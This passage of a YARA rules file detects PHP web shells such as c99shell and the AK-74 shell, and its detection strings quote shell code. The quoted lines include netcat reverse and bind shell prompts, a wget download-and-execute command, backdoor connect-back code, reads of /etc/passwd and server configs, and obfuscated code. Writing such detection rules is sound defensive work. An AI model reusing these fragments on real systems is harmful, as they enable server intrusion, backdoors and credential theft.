      description = "php17 - from files 01e9565cecc4e989123f9620c1d09c09.php, 01f78be6f7cad02658508fe4616098a9.php, 0353ab4cbed5beae847a7ff6e220b5cf.php, 05311655a15b75fab86956663e1819cd.php, 0771fc6f0f4b1d7d1bb73bbbe14e0e31.php, 0ad17701cf5e5a59aa57f35aa240d9e40d28ba50.php, 0b544ac96e173af11ffee87dee8aad446339801e.php, 15e786a334203308d12856d155bbdb8088ed8afc.php, 15febc7c452fb361fc5eca8e67711a86a9ee0b9e.php, 1898eebe767f4dda4709621164eeef8377c43bb3.php, 27.9.php, 32e36b9cd77416c8e4d5d7284d54683e75abfed6.php, 36c1b4eaebafcab661febec9cbce65e6c4e063d4.php, 398fcc4176cbdefb9271ad67decbab5c08312bf2.php, 44b8eca32932e4e42f0d59dfe67014b2bba88292.php, 4d5d25e5c18789e5e3977c1d7f6035576a7e2ea3.php, 502adcbc50636b667202497c1f398a36413e3284.php, 5a42c89ac7b0e1b19603088b61aeed203e026fc3.php, 626c5c9305cee457e10b85c81af262c5bc437255.php, 63187568f13bf233f781f008c528b0e160650211.php, 6612561e19ec45c494d5154c3b502a2e72817735.php, 67782cfe732cea7fbc4c91e9133b005ad9401377.php, 6a6f0260611dcd60d502d308f74ff3c1ad590cfe.php, 6f53dce817b117198fc0950d87e362fdcf7852e2.php, 8cb6a80a86bf37cd3977cab94909c299ec22a092.php, 9f18fc1e8b779eec4d289eea454f05549d387a51.php, acid.php, acidshell.php, AntiSecShell.v0.5.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9711738fbc89cd6b37366690193dfdd6402af920106426ff9d33aae65eaba5c8"
      hash2 = "ae6e0b74f1a1697985e45ec9fbd291fbc9ace52680fc2fd14726abf66859138a"
      hash3 = "b6f96297c1c905e32413c6deb7e794cb8a1af37b9295e5cff257a6ff063ccbd4"
      hash4 = "0202f72b3e8b62e5ebc99164c7d4eb8ec5be6a7527286e9059184aa8321e0092"
      hash5 = "faeff8e37876023a6f84c94e090b22c9b3eea333ed96d2688c45d8900f7cfdbc"
      hash6 = "59f77ca5eb2380fcee10e7282bdcbb628a075bd83ff3dfabd2b8851cc80a466b"
      hash7 = "12e93dd17c20d1aef103ccc66e1b7d5b3849b81a0ab88e8c03777a7a88fbebf0"
      hash8 = "f89d440580f05dbadc7464f2ef8d0048d367422d6fce60995a0f33467284e503"
      hash9 = "7a69466dbd18182ce7da5d9d1a9447228dcebd365e0fe855d0e02024f4117549"
      hash10 = "ef3a7cd233a880fc61efc3884f127dd8944808babd1203be2400144119b6057f"
      hash11 = "dd984fae70333dc6899b7e226362573ddef2d1185a4349e832a86c9f90ee2b3f"
      hash12 = "5ac936e86e90cda1df398a4f3044c9d6d1707bc6ddf5d1bbdfc9e03553ff907b"
      hash13 = "dad311ac627ea5509814218f21e1f11d0f61632866aadaf5c3a43629f5801c1b"
      hash14 = "2884d456f6a33415db1ce6c8ef4a9a6ed860b3f76482c8460d27bd83120858ab"
      hash15 = "2b8aed49f50acd0c1b89a399647e1218f2a8545da96631ac0882da28810eecc4"
      hash16 = "ce802123ee19441adab36ef70584cfadbbda898ed1d52082a08532e20c860dc1"
      hash17 = "80fa31cc87c2618a5ea267baed3707f78b4b7d4a20cc8a91b231d5ce1d1a42e8"
      hash18 = "353f44323be3b6564790acced0c8cbe76aa864515b16c8f8de3571fb15044481"
      hash19 = "bbe0f7278041cb3a6338844aa12c3df6b700a12a78b0a58bce3dce14f1c37b96"
      hash20 = "2a5f0fc4984d08fa9e8c3c5ccda1b09438d6bd04a7f962844088a6c45e248d71"
      hash21 = "bf83456b0b6f02b4bc25f1848c7f825cd7505f2c740f01c1a254df33bfebfa06"
      hash22 = "65e7edf10ffb355bed81b7413c77d13d592f63d39e95948cdaea4ea0a376d791"
      hash23 = "178ec234348b08e4da3d0d26f0e0db9637184e9fb4aec6b7345a5521c54456ac"
      hash24 = "1dc571ae9a2775e50505fa455a9d32b6953bc00e16afbe7fc225e8993b2e6c7a"
      hash25 = "f5e8951fddabbfebee6f93380486d027fd88f05623f3856dcf81ae05e78d9da6"
      hash26 = "d43cdb0daf132269b0a706a1a1b4970450fbaba34492e056305cab320f8c4ba5"
      hash27 = "a6580477b138c01f062a33f2f204f412d3ffcdfd44dd6bffe476aefefab1fca3"
      hash28 = "a455a962041f9ef980414ecb1695c263cea42c41731caf1f0c34293cc937b1ef"
      hash29 = "da5ea23323881addae2ecd9a44947f05d5dbc216ac24cdf9361b14f18ea8e31c"
   strings:
      $s1 = "$sql_sock = mysql_connect($sql_server.\":\".$sql_port, $sql_login, $sql_passwd);" fullword ascii
      $s2 = "if (!$fp) {echo \"Can't get /etc/passwd for password-list.\";}" fullword ascii
      $s3 = "d dump of \\$GLOBALS.</b></center>\";}" fullword ascii
      $s4 = "echo \"<textarea cols=80 rows=10>\".htmlspecialchars($encoded).\"</textarea><br><br>\";" fullword ascii
      $s5 = "elseif (!empty($ft)) {echo \"<center><b>Manually selected type is incorrect. If you think, it is mistake, please send us url and" ascii
      $s6 = "$ret = mysql_dump($set);" fullword ascii
      $s7 = "$set[\"file\"] = $dump_file;" fullword ascii
      $s8 = "if (file_exists($d.$f)) {echo \"<center><b>Permision denied (\".htmlspecialchars($d.$f).\")!</b></center>\";}" fullword ascii
      $s9 = "header(\"Last-Modified: \".gmdate(\"D, d M Y H:i:s\").\" GMT\");" fullword ascii
      $s10 = "var_dump(unserialize($v[1]));" fullword ascii
      $s11 = "if (!is_resource($sock)) {echo(\"Error: \\$sock is not valid resource.\");}" fullword ascii
      $s12 = "$len = ceil($len/2) - 2;" fullword ascii
      $s13 = "if (in_array($v,$sess_data[\"cut\"])) {$disppath = \"<strike>\".$disppath.\"</strike>\";}" fullword ascii
      $s14 = "if (!empty($arcerr)) {echo \"<b>Archivation errors:</b><br>\".$arcerr;}" fullword ascii
      $s15 = "if ($copy_unset) {foreach($sess_data[\"copy\"] as $k=>$v) {unset($sess_data[\"copy\"][$k]);}}" fullword ascii
      $s16 = "foreach ($cfgvars as $k=>$v) {echo htmlspecialchars($k).\"='\".htmlspecialchars($v).\"'<br>\";}" fullword ascii
      $s17 = "if (mysql_num_rows($res) > 0) {while ($row = mysql_fetch_row($res)) {$tabs[] = $row[0];}}" fullword ascii
      $s18 = "for ($i=0;$i<mysql_num_fields($result);$i++) {$name = mysql_field_name($result,$i);}" fullword ascii
      $s19 = "$res = mysql_query(\"SELECT * FROM `$tab`\", $sock);" fullword ascii
      $s20 = "$cmdline .= \" \".$v;" fullword ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0x6544 or uint16(0) == 0x733c or uint16(0) == 0x2a2f or uint16(0) == 0xbbef ) and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _3926ab64dcf04e87024011cf39902beac32711da_3a7fb4c3cd5df442c99050b0dc3e316de396c57c_96
{
   meta:
      description = "php17 - from files 3926ab64dcf04e87024011cf39902beac32711da.php, 3a7fb4c3cd5df442c99050b0dc3e316de396c57c.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "53fe44b4753874f079a936325d1fdc9b1691956a29c3aaf8643cdbd49f5984bf"
      hash2 = "64e6e700f39814bd9f3b84dd65b929829a73d9080ce3a8368a17e97a0eefab6a"
   strings:
      $x1 = "<tr><td colspan='2'><pre id='backResult'>Run ' nc -l -v -p port ' on your computer and press ' run ' button</pre></td></tr>" fullword ascii
      $s2 = "<tr><td colspan='2'><pre id='bindResult'>Press ' run ' button and run ' nc server_ip port ' on your computer</pre></td></tr>" fullword ascii
      $s3 = "$winbinary = (strtolower(substr(php_uname(),0,3))==\"win\")? \"<option>executable</option>\":\"\";" fullword ascii
      $s4 = "<tr><th colspan='2'><p class='boxtitle'>Bind Shell</p></th></tr>" fullword ascii
      $s5 = "<tr><td style='width:144px'>Server IP</td><td><input type='text' id='bindAddr' value='\".$server_addr.\"' disabled></td></tr>" fullword ascii
      $s6 = "$sock = fsockopen($packetHost, $packetPort, $errNo, $errStr, $packetTimeout);" fullword ascii
      $s7 = "$res .= \"<tr><td><textarea style='height:140px;min-height:140px;'>\".bin2hex($bin).\"</textarea></td></tr></table>\";" fullword ascii
      $s8 = "$packetContent = str_replace(array(\"\\\\r\",\"\\\\n\"), array(\"\\r\", \"\\n\"), $packetContent);" fullword ascii
      $s9 = "if(!preg_match(\"/[a-z0-9]+:\\/\\/.*/\", $packetHost)) $packetHost = \"tcp://\".$packetHost;" fullword ascii
      $s10 = "<tr><th colspan='2'><p class='boxtitle'>Reverse Shell</p></th></tr>" fullword ascii
      $s11 = "ISkbP1rDTMjLF6nIytBm4kHtoTU0g9rDi4zihUvk4US2d3bdmLCty29MsDmKdpBX3S5r/o1z8Mh10ym3nM4lp353m/8zsHbgkJ82E6WbM/1kJwz58XKTZ8FG8gs=\";" fullword ascii
      $s12 = "if(ctype_xdigit($packetContent)) $packetContent = @pack(\"H*\" , $packetContent);" fullword ascii
      $s13 = "$packetContent = str_replace(array(\"\\r\",\"\\n\"), \"\", $packetContent);" fullword ascii
      $s14 = "$res .= html_safe(trim($errStr)).\" (error \".html_safe(trim($errNo)).\")</div>\";" fullword ascii
      $s15 = "<td><span class='button' onclick=\\\"rs_go_bind();\\\" style='width:120px;'>run</span></td>" fullword ascii
      $s16 = "<tr><td style='width:144px'>Target IP</td><td><input type='text' id='backAddr' value='\".$remote_addr.\"' onkeydown=\\\"trap_ent" ascii
      $s17 = "<tr><td style='width:144px'>Target IP</td><td><input type='text' id='backAddr' value='\".$remote_addr.\"' onkeydown=\\\"trap_ent" ascii
      $s18 = "<tr><td colspan='2'><textarea id='packetContent' style='height:140px;min-height:140px;'>GET / HTTP/1.1\\\\r\\\\n\\\\r\\\\n</text" ascii
      $s19 = "<tr><td colspan='2'><textarea id='packetContent' style='height:140px;min-height:140px;'>GET / HTTP/1.1\\\\r\\\\n\\\\r\\\\n</text" ascii
      $s20 = "$remote_addr = isset($_SERVER['REMOTE_ADDR'])? $_SERVER['REMOTE_ADDR']:\"\";" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 700KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _0353ab4cbed5beae847a7ff6e220b5cf_0771fc6f0f4b1d7d1bb73bbbe14e0e31_502adcbc50636b667202497c1f398a36413e3284_6f53dce817b11719_97
{
   meta:
      description = "php17 - from files 0353ab4cbed5beae847a7ff6e220b5cf.php, 0771fc6f0f4b1d7d1bb73bbbe14e0e31.php, 502adcbc50636b667202497c1f398a36413e3284.php, 6f53dce817b117198fc0950d87e362fdcf7852e2.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b6f96297c1c905e32413c6deb7e794cb8a1af37b9295e5cff257a6ff063ccbd4"
      hash2 = "faeff8e37876023a6f84c94e090b22c9b3eea333ed96d2688c45d8900f7cfdbc"
      hash3 = "80fa31cc87c2618a5ea267baed3707f78b4b7d4a20cc8a91b231d5ce1d1a42e8"
      hash4 = "1dc571ae9a2775e50505fa455a9d32b6953bc00e16afbe7fc225e8993b2e6c7a"
   strings:
      $x1 = "am.ru/releases/cc99shell\\\">c99shell</a>: Access Denied - your host (\".getenv(\"REMOTE_ADDR\").\") not allow\");}" fullword ascii
      $s2 = "if (!preg_match($s,getenv(\"REMOTE_ADDR\")) and !preg_match($s,gethostbyaddr(getenv(\"REMOTE_ADDR\")))) {exit(\"<a href=\\\"http" ascii
      $s3 = "$out = \"# Dumped by C99Shell.SQL v. \".$shver.\"" fullword ascii
      $s4 = "if (file_get_contents(\"/var/cpanel/accounting.log\")) {echo \"<b><font color=\\\"green\\\"><a href=\\\"\".$surl.\"act=f&f=accou" ascii
      $s5 = "Click \"Connect\" only after open port for it. You should use NetCat&copy;, run \"<b>nc -l -n -v -p &lt;port&gt;</b>\"!<?php" fullword ascii
      $s6 = "if ($win) {echo \"<b>Binding port and Back connect:</b><br>This functions not work in Windows!<br><br>\";}" fullword ascii
      $s7 = "else {echo \"<b>Execution PHP-code</b>\"; if (empty($eval_txt)) {$eval_txt = true;}}" fullword ascii
      $s8 = "echo \"<form action=\\\"\".$surl.\"act=cmd\\\" method=\\\"POST\\\"><textarea name=\\\"cmd\\\" cols=\\\"122\\\" rows=\\\"10\\\">" ascii
      $s9 = "echo \"<form method=\\\"POST\\\"><textarea name=\\\"eval\\\" cols=\\\"122\\\" rows=\\\"10\\\">\".htmlspecialchars($eval).\"</tex" ascii
      $s10 = "if (file_get_contents(\"/etc/userdomains\")) {echo \"<b><font color=\\\"green\\\"><a href=\\\"\".$surl.\"act=f&f=userdomains&d=/" ascii
      $s11 = "if (unlink(__FILE__)) {@ob_clean(); echo \"Thanks for using c99shell v.\".$shver.\"!\"; exit; }" fullword ascii
      $s12 = "if (file_get_contents(\"/etc/httpd.conf\")) {echo \"<b><font color=\\\"green\\\"><a href=\\\"\".$surl.\"act=f&f=httpd.conf&d=/et" ascii
      $s13 = "<b>Back connection:</b><br><form method=\"POST\"><input type=\"hidden\" name=\"act\" value=\"bind\"><input type=\"hidden\" name=" ascii
      $s14 = "\\\"hidden\\\" name=\\\"d\\\" value=\\\"\".$dispd.\"\\\"><br><br><input type=\\\"submit\\\" value=\\\"Execute\\\">&nbsp;Display " ascii
      $s15 = "ut type=\\\"checkbox\\\" name=\\\"eval_txt\\\" value=\\\"1\\\"\"; if ($eval_txt) {echo \" checked\";} echo \"></form>\";" fullword ascii
      $s16 = "if ($selfwrite == \"1\") {$selfwrite = \"c99shell.php\";}" fullword ascii
      $s17 = "$data = file_get_contents($c99sh_updatefurl);" fullword ascii
      $s18 = "if (file_get_contents(\"/usr/local/apache/conf/httpd.conf\")) {echo \"<b><font color=\\\"green\\\"><a href=\\\"\".$surl.\"act=f&" ascii
      $s19 = "// default password for binding" fullword ascii
      $s20 = "$line[] = \"<a href=\\\"\".$surl.\"act=ps_aux&d=\".urlencode($d).\"&pid=\".$line[1].\"&sig=9\\\"><u>KILL</u></a>\";" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _715f17e286416724e90113feab914c707a26d456_a5d8519f57b94ab8cb8efced9fa7d21a_98
{
   meta:
      description = "php17 - from files 715f17e286416724e90113feab914c707a26d456.php, a5d8519f57b94ab8cb8efced9fa7d21a.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "3a63bbe7a6d83f5d7d0c3523ebe340f4ef0f9147bdff9a75ab7f3b24983cd6c2"
      hash2 = "8548e7070db852e66fcfe2f9aca057847a4a77171a083a715d450bb4149204ef"
   strings:
      $x1 = "passthru( $bindir.\"mysqldump --user=$USERNAME --password=$PASSWORD " fullword ascii
      $s2 = "href='$PHP_SELF?action=utils&command=show_processlist'>Processlist</a>\\n\";" fullword ascii
      $s3 = "href='$PHP_SELF?action=utils&command=flush_hosts'>Hosts</a>\\n\";" fullword ascii
      $s4 = "href='$PHP_SELF?action=utils&command=flush_logs'>Logs</a>\\n\";" fullword ascii
      $s5 = "href='$PHP_SELF?action=dumpTable&dbname=$dbname&tablename=$tablename'>Dump</a>\\n\";" fullword ascii
      $s6 = "href='$PHP_SELF?action=utils&command=flush_privileges'>Privileges</a>\\n\";" fullword ascii
      $s7 = "echo \"<a href='http://popeye.snu.ac.kr/~smkim/mysql'>Hompage<a> is " fullword ascii
      $s8 = "href='$PHP_SELF?action=dumpDB&dbname=$dbname'>Dump</a></td>\\n\";" fullword ascii
      $s9 = "href='$PHP_SELF?action=utils&command=show_variables'>Variables</a>\\n\";" fullword ascii
      $s10 = "href='$PHP_SELF?action=utils&command=flush_tables'>Tables</a>\\n\";" fullword ascii
      $s11 = "href='$PHP_SELF?action=utils&command=show_status'>Status</a>\\n\";" fullword ascii
      $s12 = "href='$PHP_SELF?action=utils&command=flush_status'>Status</a>\\n\";" fullword ascii
      $s13 = "href='$PHP_SELF?action=viewData&dbname=$dbname&tablename=$tablename&orderby=\".$field->name.\"'>\".$field->name.\"</a>\\n\";" fullword ascii
      $s14 = "echo \"<tr><td>Password </td><td> <input type=password " fullword ascii
      $s15 = "href='$PHP_SELF?action=editData&dbname=$dbname&tablename=$tablename$key'>Edit</a></td>\\n\";" fullword ascii
      $s16 = "echo \"<META HTTP-EQUIV=Refresh CONTENT='0; " fullword ascii
      $s17 = "href='$PHP_SELF?action=dropField&dbname=$dbname&tablename=$tablename&fieldname=$fieldname' " fullword ascii
      $s18 = "<tr><th>M</th><th>D</th><th>unsigned</th><th>zerofill</th><th>binary</th><th>value " fullword ascii
      $s19 = "href='$PHP_SELF?action=editField&dbname=$dbname&tablename=$tablename&fieldname=$fieldname'>Edit</a></td>\\n\";" fullword ascii
      $s20 = "href='$PHP_SELF?action=deleteData&dbname=$dbname&tablename=$tablename$key' " fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 100KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _059fdcd96baeb75112f09fa1dcc740cc_89035d926cc0dbe2b4be0e8d4da1451f6995a8b8_99
{
   meta:
      description = "php17 - from files 059fdcd96baeb75112f09fa1dcc740cc.php, 89035d926cc0dbe2b4be0e8d4da1451f6995a8b8.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d691dab705114c9dbacc304116e104807c803cb24a9bdbb6fa05610dcd2bef9d"
      hash2 = "1b22c08def8cd3be4b791dd0e5aa47bf2fd279a0612be9096e7af48a7269fe9a"
   strings:
      $s1 = "for ($b2617ce8e=0; $b2617ce8e<$GLOBALS[$GLOBALS['d88c71f1'][17].$GLOBALS['d88c71f1'][46].$GLOBALS['d88c71f1'][14].$GLOBALS['" fullword ascii
      $s2 = "for ($c3758cb0=0; $c3758cb0<$GLOBALS[$GLOBALS['d88c71f1'][17].$GLOBALS['d88c71f1'][46].$GLOBALS['d88c71f1'][14].$GLOBALS" fullword ascii
      $s3 = "$b2617ce8e<$GLOBALS[$GLOBALS['d88c71f1'][17].$GLOBALS['d88c71f1'][46].$GLOBALS['d88c71f1'][14].$GLOBALS['d88c71f1'][32].$GLOBAL" fullword ascii
      $s4 = "foreach ($GLOBALS[$GLOBALS['d88c71f1'][52].$GLOBALS['d88c71f1'][37].$GLOBALS['d88c71f1'][46].$GLOBALS['d88c71f1'][96].$GLOBA" fullword ascii
      $s5 = "echo @$GLOBALS[$GLOBALS['d88c71f1'][52].$GLOBALS['d88c71f1'][40].$GLOBALS['d88c71f1'][15].$GLOBALS['d88c71f1'][15].$GLOB" fullword ascii
      $s6 = "14].$GLOBALS['d88c71f1'][96].$GLOBALS['d88c71f1'][46].$GLOBALS['d88c71f1'][46].$GLOBALS['d88c71f1'][14]]($q174), $mb218));" fullword ascii
      $s7 = "d88c71f1'][32].$GLOBALS['d88c71f1'][37].$GLOBALS['d88c71f1'][97].$GLOBALS['d88c71f1'][42].$GLOBALS['d88c71f1'][42]]($q174);)" fullword ascii
      $s8 = "return $GLOBALS[$GLOBALS['d88c71f1'][84].$GLOBALS['d88c71f1'][96].$GLOBALS['d88c71f1'][30].$GLOBALS['d88c71f1'][42]]($GLOBAL" fullword ascii
      $s9 = "S[$GLOBALS['d88c71f1'][84].$GLOBALS['d88c71f1'][96].$GLOBALS['d88c71f1'][30].$GLOBALS['d88c71f1'][42]]($q174, $l7da), $a8295);" fullword ascii
      $s10 = "$GLOBALS['d88c71f1'][8].$GLOBALS['d88c71f1'][12] => @$GLOBALS[$GLOBALS['d88c71f1'][53].$GLOBALS['d88c71f1'][42].$GLO" fullword ascii
      $s11 = "$v3fc5 .= $GLOBALS[$GLOBALS['d88c71f1'][53].$GLOBALS['d88c71f1'][42].$GLOBALS['d88c71f1'][97].$GLOBALS['d88c71f1'][4" fullword ascii
      $s12 = "$GLOBALS['d88c71f1'][83].$GLOBALS['d88c71f1'][12] => $GLOBALS['d88c71f1'][40].$GLOBALS['d88c71f1'][31].$GLOBALS['d88" fullword ascii
      $s13 = "88c71f1'][37].$GLOBALS['d88c71f1'][97].$GLOBALS['d88c71f1'][42].$GLOBALS['d88c71f1'][97].$GLOBALS['d88c71f1'][46];" fullword ascii
      $s14 = "][76].$GLOBALS['d88c71f1'][32].$GLOBALS['d88c71f1'][53]] = $_POST;" fullword ascii
      $s15 = "][60]] = $GLOBALS['d88c71f1'][97].$GLOBALS['d88c71f1'][2].$GLOBALS['d88c71f1'][77].$GLOBALS['d88c71f1'][42];" fullword ascii
      $s16 = ".$GLOBALS['d88c71f1'][47].$GLOBALS['d88c71f1'][4].$GLOBALS['d88c71f1'][47].$GLOBALS['d88c71f1'][83], 0);" fullword ascii
      $s17 = "8c71f1'][42].$GLOBALS['d88c71f1'][32].$GLOBALS['d88c71f1'][42].$GLOBALS['d88c71f1'][37]]($a8295[$c3758cb0]));" fullword ascii
      $s18 = "'][17].$GLOBALS['d88c71f1'][14].$GLOBALS['d88c71f1'][77].$GLOBALS['d88c71f1'][17].$GLOBALS['d88c71f1'][15]](0);" fullword ascii
      $s19 = "][49].$GLOBALS['d88c71f1'][47].$GLOBALS['d88c71f1'][66].$GLOBALS['d88c71f1'][17].$GLOBALS['d88c71f1'][22];" fullword ascii
      $s20 = "BALS['d88c71f1'][60].$GLOBALS['d88c71f1'][76].$GLOBALS['d88c71f1'][17].$GLOBALS['d88c71f1'][60]]()," fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 30KB and ( 8 of them )
      ) or ( all of them )
}

rule _01f78be6f7cad02658508fe4616098a9_1898eebe767f4dda4709621164eeef8377c43bb3_626c5c9305cee457e10b85c81af262c5bc437255_6612561e_100
{
   meta:
      description = "php17 - from files 01f78be6f7cad02658508fe4616098a9.php, 1898eebe767f4dda4709621164eeef8377c43bb3.php, 626c5c9305cee457e10b85c81af262c5bc437255.php, 6612561e19ec45c494d5154c3b502a2e72817735.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ae6e0b74f1a1697985e45ec9fbd291fbc9ace52680fc2fd14726abf66859138a"
      hash2 = "ef3a7cd233a880fc61efc3884f127dd8944808babd1203be2400144119b6057f"
      hash3 = "bbe0f7278041cb3a6338844aa12c3df6b700a12a78b0a58bce3dce14f1c37b96"
      hash4 = "bf83456b0b6f02b4bc25f1848c7f825cd7505f2c740f01c1a254df33bfebfa06"
   strings:
      $x1 = "myshellexec(\"lynx -dump $adires > sayko_bind;chmod 777 sayko_bind;./sayko_bind\");" fullword ascii
      $x2 = "myshellexec(\"wget $adires -O sayko_bind;chmod 777 sayko_bind;./sayko_bind\");" fullword ascii
      $s3 = "$out = \"# Dumped by Locous7Shell.SQL v. \".$shver.\"" fullword ascii
      $s4 = "if (file_get_contents(\"/var/cpanel/accounting.log\")) {echo \"<b><font color=green><a href=\\\"\".$surl.\"act=f&f=accounting.lo" ascii
      $s5 = "bd $por\",$scan)){ $data = (\"\\n</br>Process not found running, backdoor not setup successfully.\"); }" fullword ascii
      $s6 = "$blah = ex($p2.\" /tmp/back \".$_GET['ipi'].\" \".$_GET['pipi'].\" &\");" fullword ascii
      $s7 = "\".urlencode(\"/usr/local/apache/conf\").\"&ft=txt\\\"><u><b>Apache configuration (httpd.conf)</b></u></a></font></b><br>\";}" fullword ascii
      $s8 = "array(\"<b>[Proc.]</b>\",$surl.\"act=processes&d=%d\")," fullword ascii
      $s9 = "c\").\"&ft=txt\\\"><u><b>Syslog configuration (syslog.conf)</b></u></a></font></b><br>\";}" fullword ascii
      $s10 = "c\").\"&ft=txt\\\"><u><b>View cpanel user-domains logs</b></u></a></font></b><br>\";}" fullword ascii
      $s11 = "echo\"<b>Now script try connect to \".$_GET['ipi'].\" port \".$_GET['pipi'].\" ...</b>\";" fullword ascii
      $s12 = ").\"&ft=txt\\\"><u><b>Apache configuration (httpd.conf)</b></u></a></font></b><br>\";}" fullword ascii
      $s13 = "echo \"<TABLE cellSpacing=0 cellPadding=2 bgcolor=#000000 borderColorLight=#333333 border=1><td><b>ID</b></td><td><b>USER</b></t" ascii
      $s14 = "rlencode(\"/var/cpanel/\").\"\\\"&ft=txt><u><b>View cpanel logs</b></u></a></font></b><br>\";}" fullword ascii
      $s15 = "ho $surl; ?>\" method=\"POST\"><input type=\"hidden\" name=\"act\" value=\"sql\"><tr><td><input type=\"text\" name=\"sql_login\"" ascii
      $s16 = ")\\\" onMouseout=\\\"this.select()\\\" value=\\\"\".base64_encode($encoder_input).\"\\\" readonly></center>\";" fullword ascii
      $s17 = "if (file_get_contents(\"/etc/syslog.conf\")) {echo \"<b><font color=green><a href=\\\"\".$surl.\"act=f&f=syslog.conf&d=\".urlenc" ascii
      $s18 = "*  MEMBERS ACCESS, BAN FROM SITE, AND NO REFUND FOR VIP." fullword ascii
      $s19 = "array(\"<b>[FTP Brute]</b>\",$surl.\"act=ftpquickbrute&d=%d\")," fullword ascii
      $s20 = "\\\" onMouseout=\\\"this.select()\\\" value=\\\"\".urlencode($encoder_input).\"\\\" readonly>" fullword ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0x733c ) and filesize < 700KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _4abe7634820f3bf12d961cba7e2a3671ed3dfddf_AK_74_Security_Team_Web_Shell_Beta_Version_AK_74_Security_Team_AK_74_Security_Team_101
{
   meta:
      description = "php17 - from files 4abe7634820f3bf12d961cba7e2a3671ed3dfddf.php, AK-74 Security Team Web Shell Beta Version.php, AK-74_Security_Team.php, AK_74_Security_Team_Web_Shell_Beta_Version.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b7909ffe6a4479750b77b969bfe516841436aba67115d4b137b372619993f027"
      hash2 = "dc91561fd0b7a555e9e1a26fdd189d18832b9d896f50e7f8afa153773d1a851c"
      hash3 = "240e94bf8a28e2104c6aded0c7ffffd0ed3d5f34af20defac6db69abf08b1b32"
      hash4 = "75087c6173f53d75216e20ae3e0b500c54f887ca9071528fa5e2a95bb4507d53"
   strings:
      $x1 = "<b><font color=#830000>3.</font></b><font color=#830000> <b><font color=#830000>User</b></font> - '.( get_current_user()).' " fullword ascii
      $x2 = "$res .= '<form action=\"'.$xshell.'?act=execute\" method=\"post\"><input type=\"hidden\" name=\"action\" value=\"execute\">" fullword ascii
      $x3 = "<b><font color=#830000>7. Your IP - </font></b><font color=#830000>'.(getenv('REMOTE_ADDR')).'</font><br><br>" fullword ascii
      $s4 = "<b><font color=#830000>4. Server Software - </font></b><font color=#830000>'.(getenv('SERVER_SOFTWARE')).'</font><br><br>" fullword ascii
      $s5 = "<tr><td align=center><b><font color=#83000>Copyright </font><a href=\"http://ak74-team.net\" target=\"_blank\">AK-74 Security Te" ascii
      $s6 = "$res .= '<tr><td align=center><b><font color=#83000>Copyright </font><a href=\"http://ak74-team.net\" target=\"_blank\">AK-74 Se" ascii
      $s7 = "<b><font color=#830000>5. Request Method - </font></b><font color=#830000>'.(getenv('REQUEST_METHOD')).'</font><br><br>" fullword ascii
      $s8 = "if (!move_uploaded_file($_FILES['filename']['tmp_name'],$_SESSION['currentdir'].'/'.$_POST['filename2']))" fullword ascii
      $s9 = "<b><font color=#830000>6. Server IP - </font></b><font color=#830000>'.(getenv('SERVER_ADDR')).'</font><br><br>" fullword ascii
      $s10 = "$res .= '<form action=\"'.$xshell.'?act=filemanager\" method=\"post\"><input type=\"hidden\" name=\"action\" value=\"chmod\">'" fullword ascii
      $s11 = "$res .= '<form action=\"'.$xshell.'?act=exesys\" method=\"post\"><input type=\"hidden\" name=\"action\" value=\"exesys\">" fullword ascii
      $s12 = "<a href=\"'.$xshell.'?act=phpinfo\" target=\"_blank\">phpinfo()</a>" fullword ascii
      $s13 = "if (!copy($_FILES['filename']['tmp_name'],$_SESSION['currentdir'].'/'.$_POST['filename2']))" fullword ascii
      $s14 = "ty Team<a> <font color=#83000>2005 - '.date(\"Y\").'</font></b></td></tr>';" fullword ascii
      $s15 = "$res .= '<html><head><title>AK-74 Security Team Web Shell</title><meta http-equiv=\"Content-Type\" content=\"text/html; charset=" ascii
      $s16 = "<b><font color=#830000>8. X Forwarded For IP - </font></b><font color=#830000>'.(getenv('HTTP_X_FORWARDED_FOR')).'</font><br><br" ascii
      $s17 = "<b><font color=#830000>8. X Forwarded For IP - </font></b><font color=#830000>'.(getenv('HTTP_X_FORWARDED_FOR')).'</font><br><br" ascii
      $s18 = "> <font color=#83000>2005 - '.date(\"Y\").'</font></b></td></tr>';" fullword ascii
      $s19 = "PHP - </font></b><font color=#830000>'.(phpversion()).'</font><br><br>" fullword ascii
      $s20 = "<b><font color=#830000>1. OS - </font></b><font color=#830000>'.(php_uname()).'</font><br><br>" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 60KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _27_9_44b8eca32932e4e42f0d59dfe67014b2bba88292_102
{
   meta:
      description = "php17 - from files 27.9.php, 44b8eca32932e4e42f0d59dfe67014b2bba88292.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "dd984fae70333dc6899b7e226362573ddef2d1185a4349e832a86c9f90ee2b3f"
      hash2 = "2b8aed49f50acd0c1b89a399647e1218f2a8545da96631ac0882da28810eecc4"
   strings:
      $x1 = "color: #fff\">http://devilzc0de.com/</a></u><br> # Contact : failed404@gmail.com </u></p>" fullword ascii
      $s2 = "# Home page: http://devilzc0de.com/" fullword ascii
      $s3 = "<body bgcolor=\"#000000\" background=\"http://oi52.tinypic.com/sphybr.jpg\" link=\"#444444\" vlink=\"#444444\">" fullword ascii
      $s4 = "echo \"<TABLE width=100% id=bordered><td><b>ID</b></td><td><b>USER</b></td><td><b>HOST</b></td><td><b>DB</b></td><td><b>COMM" fullword ascii
